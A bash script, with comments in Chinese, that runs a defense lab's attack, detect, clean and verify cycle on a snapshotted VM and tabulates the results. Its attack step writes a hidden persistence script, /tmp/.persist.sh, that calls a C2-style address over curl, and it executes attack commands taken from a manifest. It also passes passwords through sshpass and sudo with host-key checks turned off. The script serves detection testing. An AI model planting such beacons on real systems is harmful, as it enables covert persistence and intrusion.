#!/usr/bin/env bash
# 消杀闭环编排器：每技术 攻击→检测→消杀→验证
# 用法: remediate_round.sh <vm_ip> [只跑指定技术id]
set -euo pipefail
VM_IP="${1:?用法: remediate_round.sh <vm_ip> [技术id]}"
ONLY="${2:-}"
VM=defense-atomic-0
DL=~/defense-lab
OUT=$DL/data/remediate
mkdir -p "$OUT"
PY=~/miniconda3/envs/ai/bin/python
SSH="sshpass -p <vm-password> ssh -n -o StrictHostKeyChecking=no -o ConnectTimeout=8 ubuntu@$VM_IP"
SCP="sshpass -p <vm-password> scp -o StrictHostKeyChecking=no"
SSHPASS="<vm-password>"

wait_ssh() { for i in $(seq 1 24); do $SSH true 2>/dev/null && return 0; sleep 5; done; return 1; }
run_vm() { $SSH "echo $SSHPASS | sudo -S bash -c '$1'" ; }

python3 - "$DL/range/atomic/collect_manifest.yaml" "$ONLY" <<'EOF' > /tmp/rem_techniques.tsv
import sys, yaml, json
man = yaml.safe_load(open(sys.argv[1]))
for t in man:
    if sys.argv[2] and t["id"] != sys.argv[2]:
        continue
    print(t["id"], json.dumps(t, ensure_ascii=False), sep="\t")
EOF

RESULTS=$OUT/results.tsv
: > "$RESULTS"
while IFS=$'\t' read -r tid tjson; do
  echo "=== $tid ==="
  virsh -c qemu:///system snapshot-revert $VM clean >/dev/null 2>&1 || true
  wait_ssh
  $SCP /usr/local/bin/tracee-defense "ubuntu@$VM_IP:/tmp/tracee-bin" >/dev/null 2>&1
  $SSH "chmod +x /tmp/tracee-bin"

  # 攻击
  $SSH 'printf "#!/bin/sh\ncurl http://198.51.100.1/c2 2>/dev/null || ping -c1 198.51.100.1\n" > /tmp/.persist.sh; chmod +x /tmp/.persist.sh'
  run_vm 'nohup /tmp/tracee-bin --events sched_process_exec,security_socket_connect --output json > /tmp/atk.jsonl 2>/dev/null &'
  sleep 3
  echo "$tjson" | python3 -c "
import json,sys
t=json.load(sys.stdin)
for c in t.get('setup',[])+t['attack']: print(c)
" | while read -r cmd; do
    [ -n "$cmd" ] && $SSH "$cmd" >/dev/null 2>&1 || true
  done
  sleep 4
  run_vm 'pkill tracee-bin || true'

  # 验证攻击成功（verify 应显示 DIRTY/非 CLEAN）
  V1=$(echo "$tjson" | python3 -c "
import json,sys
t=json.load(sys.stdin)
for c in t.get('verify',[]): print(c)
" | while read -r cmd; do $SSH "$cmd" 2>/dev/null; done | grep -c CLEAN || true)
  ATK_OK="是"; [ "$V1" -gt 0 ] && ATK_OK="否(未建立)"

  # 拉轨迹检测
  $SSH "echo $SSHPASS | sudo -S cat /tmp/atk.jsonl" > "$OUT/${tid//./_}.jsonl" 2>/dev/null
  DET=$($PY $DL/detector/detect_in_trace.py $DL/detector/model-host-r3-clean "$OUT/${tid//./_}.jsonl" 2>/dev/null | tail -1)
  N_ALERT=$(echo "$DET" | python3 -c "import json,sys; print(json.load(sys.stdin)['alerts'])")
  HITS=$(echo "$DET" | python3 -c "import json,sys; d=json.load(sys.stdin); print(','.join(d['proto_hits']+d['pattern_hits']) or '-')")

  # 消杀（检出才动手）
  RESP="跳过"
  if [ "$N_ALERT" -gt 0 ]; then
    echo "$tjson" | python3 -c "
import json,sys
t=json.load(sys.stdin)
for c in t.get('cleanup',[]): print(c)
" | while read -r cmd; do
      [ -n "$cmd" ] && $SSH "$cmd" >/dev/null 2>&1 || true
    done
    RESP="已执行"
  fi

  # 验证清理（verify 应全 CLEAN）
  V2=$(echo "$tjson" | python3 -c "
import json,sys
t=json.load(sys.stdin)
for c in t.get('verify',[]): print(c)
" | while read -r cmd; do $SSH "$cmd" 2>/dev/null; done | grep -c CLEAN || true)
  NV=$(echo "$tjson" | python3 -c "import json,sys; print(len(json.load(sys.stdin).get('verify',[])))")
  CLEAN_OK="是"; [ "$V2" -lt "$NV" ] && CLEAN_OK="否"

  echo -e "$tid\t$ATK_OK\t$N_ALERT\t$HITS\t$RESP\t$CLEAN_OK" >> "$RESULTS"
  echo "  攻击=$ATK_OK 告警=$N_ALERT 命中=$HITS 消杀=$RESP 清理=$CLEAN_OK"
done < /tmp/rem_techniques.tsv

echo; echo "== 结果矩阵 =="
column -t -s$'\t' "$RESULTS"
